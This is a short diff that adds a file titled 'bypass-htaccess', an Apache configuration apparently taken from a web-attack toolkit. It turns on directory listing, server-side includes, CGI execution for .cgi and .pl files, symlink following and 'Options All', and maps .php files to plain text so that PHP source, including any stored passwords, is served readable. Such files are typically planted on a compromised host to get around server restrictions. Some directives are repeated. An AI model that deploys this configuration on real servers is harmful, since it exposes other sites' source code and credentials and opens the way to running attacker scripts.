@@ -1,0 +1,12 @@
+# bypass-htaccess
+
+OPTIONS  Indexes Includes ExecCGI FollowSymLinks
+AddHandler txt .php
+AddHandler cgi-script .cgi
+AddHandler cgi-script .pl
+OPTIONS  Indexes Includes ExecCGI FollowSymLinks
+Options Indexes FollowSymLinks
+AddType txt .php
+AddType text/html .shtml
+Options All
+Options All
